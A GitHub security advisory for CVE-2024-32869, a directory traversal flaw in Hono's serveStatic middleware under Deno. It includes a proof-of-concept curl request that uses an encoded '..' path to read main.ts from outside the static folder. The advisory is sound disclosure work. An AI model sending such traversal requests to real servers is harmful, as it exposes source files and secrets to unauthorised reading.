# [M] Hono vulnerable to Restricted Directory Traversal in serveStatic with deno

## Summary
Severity: Medium
Advisory: GHSA-3mpf-rcc7-5347
CVE: CVE-2024-32869
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2024-04-23
Source: https://github.com/advisories/GHSA-3mpf-rcc7-5347
Type: github-advisory

## Affected
- npm: `hono` — affected >=0 <4.2.7

## Details
### Summary

When using serveStatic with deno, it is possible to directory traverse where main.ts is located.

My environment is configured as per this tutorial
https://hono.dev/getting-started/deno

### PoC

```bash
$ tree
.
├── deno.json
├── deno.lock
├── main.ts
├── README.md
└── static
    └── a.txt
```

source

```jsx
import { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'
import { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'

const app = new Hono()
app.use('/static/*', serveStatic({ root: './' }))

Deno.serve(app.fetch)
```

request

```bash
curl localhost:8000/static/%2e%2e/main.ts
```

response is content of main.ts

### Impact

Unexpected files are retrieved.

## References
- https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347
- https://nvd.nist.gov/vuln/detail/CVE-2024-32869
- https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65
- https://github.com/honojs/hono
